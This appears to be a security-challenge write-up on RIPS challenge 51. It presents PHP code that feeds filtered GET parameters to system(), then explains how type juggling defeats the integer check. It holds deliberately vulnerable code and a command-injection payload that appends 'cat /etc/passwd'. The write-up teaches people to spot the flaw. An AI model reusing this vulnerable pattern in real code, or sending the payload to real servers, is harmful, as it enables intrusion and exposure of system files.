---

title: rips-51
author: raxjs
tags: [php]

---

Extracting parameter with ParameterExtractor in PHP.

<!--more-->
{{< reference src="https://twitter.com/ripstech/status/1131863413561315328" >}}

# Code
{{< code language="php"  title="Challenge" expand="Show" collapse="Hide" isCollapsed="false" >}}
declare(strict_types=1);

class ParamExtractor {
    private $validIndices = [];

    public function indices($input) {
        $validate = function (int $value, $key) {
            if($value > 0) {
                $this->validIndices[] = $key;
            }
        };

        try {
            array_walk($input, $validate, 0);
        } catch (TypeError $error) {
            echo "Only numbers are allowed as input";
        }

        return $this->validIndices;
    }

    public function getCommand($parameters) {
        $indices = $this->indices($parameters);
        $params = [];
        foreach ($indices as $index) {
            $params[] = $parameters[$index];
        }
        return implode($params, ' ');
    }
}

$cmd = (new ParamExtractor())->getCommand($_GET['p']);
system('resizeImg image.png ' . $cmd);

{{< /code >}}

# Solution
{{< code language="php" highlight="10-13,19,34,35,40,42" title="Solution" expand="Show" collapse="Hide" isCollapsed="true" >}}
declare(strict_types=1);

class ParamExtractor {
    private $validIndices = [];

    public function indices($input) {
	
        $validate = function (int $value, $key) {
			// 3) $value and $key is user input                         	
			//    the type check is vulnerable against php type juggling	
			//    in php version < 8.0                                  	
            if($value > 0) {
                $this->validIndices[] = $key;
            }
        };

        try {
			// 2) $input is user input
            array_walk($input, $validate, 0);
        } catch (TypeError $error) {
            echo "Only numbers are allowed as input";
        }

        return $this->validIndices;
    }

    public function getCommand($parameters) {
        $indices = $this->indices($parameters);
        $params = [];
        foreach ($indices as $index) {
            $params[] = $parameters[$index];
        }
		// 4) the $params array can have arbitrary strings because of	
		//    the type juggling problem above                        	
        return implode($params, ' ');
    }
}

// 1) argument to getCommand is user input
$cmd = (new ParamExtractor())->getCommand($_GET['p']);
// 5) os command injection here
system('resizeImg image.png ' . $cmd);




# example:

var_dump((new ParamExtractor())->getCommand(array(1, 2, "1 ;cat /etc/passwd")));
#PHP Notice:  A non well formed numeric value encountered in php shell code on line 7
#string(22) "1 2 1 ;cat /etc/passwd"


{{< /code >}}
